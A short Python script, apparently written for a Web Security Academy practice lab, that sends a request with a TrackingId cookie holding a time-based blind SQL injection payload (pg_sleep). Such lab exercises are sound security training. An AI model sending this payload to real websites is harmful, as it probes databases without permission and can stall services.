import requests

url = "https://0aef001f04dee2178dbf3d42006c00e1.web-security-academy.net/"

cookies = {
    "TrackingId": "' || pg_sleep(10)-- -"
}

r = requests.get(url, cookies=cookies)